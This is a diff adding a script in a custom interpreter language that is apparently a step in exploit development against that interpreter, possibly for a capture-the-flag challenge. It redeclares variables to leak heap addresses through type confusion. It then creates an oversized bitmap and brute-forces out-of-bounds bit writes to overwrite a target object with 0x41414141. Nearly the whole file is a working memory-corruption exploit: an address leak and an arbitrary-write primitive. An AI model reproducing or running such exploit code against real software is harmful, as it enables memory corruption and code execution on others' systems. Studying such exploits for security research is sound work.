@@ -1,0 +1,71 @@
+print("=== Wide Brute Force Write Test ===");
+
+print("Step 1: Leak addresses");
+int leak1 = 0;
+string leak1 = "first";
+int addr1 = leak1;
+print("addr1:");
+print(addr1);
+
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("targetaddr:");
+print(targetaddr);
+
+print("Step 2: Create bitmap");
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Step 3: Calculate base bit_index");
+int entryaddr = targetaddr - 768;
+int valueptraddr = entryaddr + 40;
+int bitmapptr = addr1 - 4096;
+int offset = valueptraddr - bitmapptr;
+int bitindex = offset * 8;
+print("Calculated bit_index:");
+print(bitindex);
+
+print("Step 4: Try writing test value at wide range of offsets");
+print("Test value: 0x41414141");
+int testvalue = 1094795585;
+
+print("Trying bit_index values from -512 to +512 in steps of 64");
+int i = -512;
+int found = 0;
+while (i <= 512) {
+    int testbitindex = bitindex + i;
+    if (testbitindex >= 0) {
+        set(b1, testbitindex + 0, 0, 1);
+        set(b1, testbitindex + 6, 0, 1);
+        set(b1, testbitindex + 8, 0, 1);
+        set(b1, testbitindex + 14, 0, 1);
+        set(b1, testbitindex + 16, 0, 1);
+        set(b1, testbitindex + 22, 0, 1);
+        set(b1, testbitindex + 24, 0, 1);
+        set(b1, testbitindex + 30, 0, 1);
+        int verify = target;
+        if (verify == testvalue) {
+            print("SUCCESS! Found working bit_index offset:");
+            print(i);
+            print("Working bit_index:");
+            print(testbitindex);
+            found = 1;
+            break;
+        }
+        set(b1, testbitindex + 0, 0, 0);
+        set(b1, testbitindex + 6, 0, 0);
+        set(b1, testbitindex + 8, 0, 0);
+        set(b1, testbitindex + 14, 0, 0);
+        set(b1, testbitindex + 16, 0, 0);
+        set(b1, testbitindex + 22, 0, 0);
+        set(b1, testbitindex + 24, 0, 0);
+        set(b1, testbitindex + 30, 0, 0);
+    }
+    i = i + 64;
+}
+
+if (found == 0) {
+    print("No working offset found in range -512 to +512");
+    print("Try wider range or different approach");
+}
+
